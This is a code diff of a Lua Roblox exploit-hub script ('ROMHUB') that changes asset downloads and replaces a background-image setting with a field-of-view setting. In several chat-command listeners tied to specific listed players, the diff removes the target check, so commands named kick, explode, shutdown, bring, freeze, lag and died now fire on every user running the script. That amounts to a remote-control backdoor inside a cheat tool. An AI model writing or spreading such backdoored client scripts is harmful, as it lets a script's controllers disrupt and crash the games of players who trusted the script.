@@ -8,6 +8,13 @@ local pfp
 local user
 if isfolder("ROMHUB") == false then
 makefolder("ROMHUB")
+else
+if not isfile("ROMHUB//Assets//X.png") then
+writefile("ROMHUB//Assets//X.png",game:HttpGet("https://raw.githubusercontent.com/onelnwza101/Assets/refs/heads/main/X.png"))
+end
+if not isfile("ROMHUB//Assets//WLogo.png") then
+writefile("ROMHUB//Assets//WLogo.png",game:HttpGet("https://raw.githubusercontent.com/onelnwza101/Assets/refs/heads/main/WLogo.png"))
+end
 end
 if not isfolder("ROMHUB//Assets") then
 makefolder("ROMHUB//Assets")
@@ -150,10 +157,8 @@ _G.SettingSave = {
    HideText = false;
    FastIntro = false;
    Fov = "70";
-   BackgroundImage = "rbxassetid://15042983694";
 }   
-writefile("ROMHUB//Assets//RLogo.png",game:HttpGet("https://raw.githubusercontent.com/onelnwza101/Assets/blob/main/WLogo.png"))
-writefile("ROMHUB//Assets//RLogo.png",game:HttpGet("https://raw.githubusercontent.com/onelnwza101/Assets/blob/main/X.png"))
+
 function loadsetting()
 
 local HttpService= game:GetService("HttpService")
@@ -484,7 +489,7 @@ end)
     Background.ClipsDescendants = true
     Background.Position = UDim2.new(0, 99, 0, 29)
     Background.Size = UDim2.new(0, 525, 0, 318)
-    Background.Image = _G.SettingSave.BackgroundImage
+    Background.Image = "rbxassetid://15042983694"
     Background.ImageTransparency = 0.4
     
     BackgroundCorner.CornerRadius = UDim.new(0, 4)
@@ -852,42 +857,26 @@ message = string.lower(Message)
 			local Command = splitString[1] 
 			local cmd = Command:split(Prefix) 
 			local cmdName = cmd[2] 
-			local args = {} --Defines a table for arguments
-				for i = 2, #splitString, 1 do  --Creates a table of all the arguments of the message
-					table.insert(args,splitString[i])
-				end
-				if args[1] ~= nil or not args[1] == all then
-				for _,Target in pairs(game.Players:GetChildren()) do
-				if Target.name:find(args[1]) then
-				TargetPlayer = Target.name
-				end
-				end
-				else
-				if args[1] == all then
-				for _,Target in pairs(game.Players:GetChildren()) do
-				TargetPlayer = Target.name
-				end
-				end
-				end
-			if cmd[2] == "kick" and TargetPlayer == game.Players.LocalPlayer.Name then
+			
+			if cmd[2] == "kick" then
 			Kick()
 			end
-			if cmd[2] == "explode" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "explode" then
 			Explode()
 			end
-			if cmd[2] == "shutdown" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "shutdown" then
 			Shutdown()
 			end
-			if cmd[2] == "bring" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "bring" then
 			Bring()
 			end
-			if cmd[2] == "freeze" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "freeze" then
 			Freeze()
 			end
-			if cmd[2] == "unfreeze" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "unfreeze" then
 			UnFreeze()
 			end
-			if cmd[2] == "died" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "died" then
 			Died()
 			end
 end
@@ -905,45 +894,29 @@ if player.name == v then
 			local Command = splitString[1] 
 			local cmd = Command:split(Prefix) 
 			local cmdName = cmd[2] 
-			local args = {} --Defines a table for arguments
-				for i = 2, #splitString, 1 do  --Creates a table of all the arguments of the message
-					table.insert(args,splitString[i])
-				end
-				if args[1] ~= nil or not args[1] == all then
-				for _,Target in pairs(game.Players:GetChildren()) do
-				if Target.name:find(args[1]) then
-				TargetPlayer = Target.name
-				end
-				end
-				else
-				if args[1] == all then
-				for _,Target in pairs(game.Players:GetChildren()) do
-				TargetPlayer = Target.name
-				end
-				end
-				end
-			if cmd[2] == "kick" and TargetPlayer == game.Players.LocalPlayer.Name then
+			
+			if cmd[2] == "kick" then
 			Kick()
 			end
-			if cmd[2] == "explode" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "explode" then
 			Explode()
 			end
-			if cmd[2] == "shutdown" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "shutdown" then
 			Shutdown()
 			end
-			if cmd[2] == "bring" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "bring" then
 			Bring()
 			end
-			if cmd[2] == "freeze" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "freeze" then
 			Freeze()
 			end
-			if cmd[2] == "unfreeze" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "unfreeze" then
 			UnFreeze()
 			end
-			if cmd[2] == "lag" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "lag" then
 			Lag()
 			end
-			if cmd[2] == "died" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "died" then
 			Died()
 			end
 	end)
@@ -960,45 +933,29 @@ if player.name == v then
 			local Command = splitString[1] 
 			local cmd = Command:split(Prefix) 
 			local cmdName = cmd[2] 
-			local args = {} --Defines a table for arguments
-				for i = 2, #splitString, 1 do  --Creates a table of all the arguments of the message
-					table.insert(args,splitString[i])
-				end
-				if args[1] ~= nil or not args[1] == all then
-				for _,Target in pairs(game.Players:GetChildren()) do
-				if Target.name:find(args[1]) then
-				TargetPlayer = Target.name
-				end
-				end
-				else
-				if args[1] == all then
-				for _,Target in pairs(game.Players:GetChildren()) do
-				TargetPlayer = Target.name
-				end
-				end
-				end
-			if cmd[2] == "kick" and TargetPlayer == game.Players.LocalPlayer.Name then
+			
+			if cmd[2] == "kick" then
 			Kick()
 			end
-			if cmd[2] == "explode" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "explode" then
 			Explode()
 			end
-			if cmd[2] == "shutdown" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "shutdown" then
 			Shutdown()
 			end
-			if cmd[2] == "bring" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "bring" then
 			Bring()
 			end
-			if cmd[2] == "freeze" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "freeze" then
 			Freeze()
 			end
-			if cmd[2] == "unfreeze" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "unfreeze" then
 			UnFreeze()
 			end
-			if cmd[2] == "lag" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "lag" then
 			Lag()
 			end
-			if cmd[2] == "died" and TargetPlayer == game.Players.LocalPlayer.Name then
+			if cmd[2] == "died" then
 			Died()
 			end
 	end)
@@ -1301,6 +1258,9 @@ end)
 
 spawn(function()
 	while wait() do
+	if _G.SettingSave.Fov then
+	game.Workspace.Camera.FieldOfView = _G.SettingSave.Fov
+	end
 	if _G.SettingSave.Anonymous and _G.SettingSave.HideText then
 	UserImage.ImageTransparency = 1
 User.TextTransparency = 1
@@ -1368,7 +1328,7 @@ local textboxElement = Instance.new("TextButton")
                 TextBox.Font = Enum.Font.Gotham
                 TextBox.PlaceholderColor3 = Color3.fromRGB(themeList.SchemeColor.r * 255 - 19, themeList.SchemeColor.g * 255 - 26, themeList.SchemeColor.b * 255 - 35)
                 TextBox.PlaceholderText = "Type here!"
-                TextBox.Text = _G.SettingSave.BackgroundImage
+                TextBox.Text = _G.SettingSave.Fov
                 TextBox.TextColor3 = themeList.SchemeColor
                 TextBox.TextSize = 7.500
 
@@ -1382,7 +1342,7 @@ local textboxElement = Instance.new("TextButton")
                 togName.Position = UDim2.new(0.096704483, 0, 0.462727281, 0)
                 togName.Size = UDim2.new(0, 138, 0, 14)
                 togName.Font = Enum.Font.GothamSemibold
-                togName.Text = "Background Image"
+                togName.Text = "FOV"
                 togName.RichText = true
                 togName.TextColor3 = themeList.TextColor
                 togName.TextSize = 12.000
@@ -1402,29 +1362,29 @@ end
                         Utility:TweenObject(blurFrame, {BackgroundTransparency = 1}, 0.2)
                     end
                     if not EnterPressed then
-                       if TextBox.Text ~= _G.SettingSave.BackgroundImage then
+                       if TextBox.Text ~= _G.SettingSave.Fov then
                        if isNumber(TextBox.Text) then
-                       rblxId = "rbxassetid://" .. TextBox.Text
-                       _G.SettingSave.BackgroundImage = rblxId
+             
+                       _G.SettingSave.Fov = TextBox.Text
                        saveSettings()
-                       Background.Image = rblxId
+                       
                       else
-                       G.SettingSave.BackgroundImage = TextBox.Text
+                       _G.SettingSave.Fov = TextBox.Text
                        saveSettings()
-                       Background.Image = TextBox.Text
+                       
                        end
                      end 
                     else
-                if TextBox.Text ~= _G.SettingSave.BackgroundImage then
+                if TextBox.Text ~= _G.SettingSave.Fov then
                        if isNumber(TextBox.Text) then
-                       rblxId = "rbxassetid://" .. TextBox.Text
-                       _G.SettingSave.BackgroundImage = rblxId
+                       
+                       _G.SettingSave.Fov = TextBox.Text
                        saveSettings()
-                       Background.Image = rblxId
+                       
                       else
-                       G.SettingSave.BackgroundImage = TextBox.Text
+                       _G.SettingSave.Fov = TextBox.Text
                        saveSettings()
-                       Background.Image = TextBox.Text
+                       
                        end
                      end 
                     end
